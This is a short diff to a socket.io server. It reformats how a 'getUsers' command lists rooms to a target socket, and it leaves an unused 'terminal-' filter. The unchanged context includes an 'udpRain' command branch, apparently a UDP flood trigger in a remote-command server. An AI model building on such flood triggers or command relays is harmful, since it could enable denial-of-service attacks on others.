@@ -211,9 +211,11 @@ io.on("connection", (socket) => {
 
   socket.on("getRunRequest", (data) => {
     if (data.cmd === "getUsers") {
-      data["cmd"] = JSON.stringify(Array.from(io.sockets.adapter.rooms))
-        .split(",")
-        .join("\r\n");
+      // Room listesini daha okunabilir formatta döndür
+      const rooms = Array.from(io.sockets.adapter.rooms);
+      const terminalRooms = rooms.filter(room => room.startsWith("terminal-"));
+      // Her satırda bir room olsun
+      data["cmd"] = rooms.join("\r\n");
       io.to(data.to).emit("getRunResponse", data);
     } else if (data.cmd.indexOf("udpRain") > -1) {
       console.log("udpRain triggered on server");
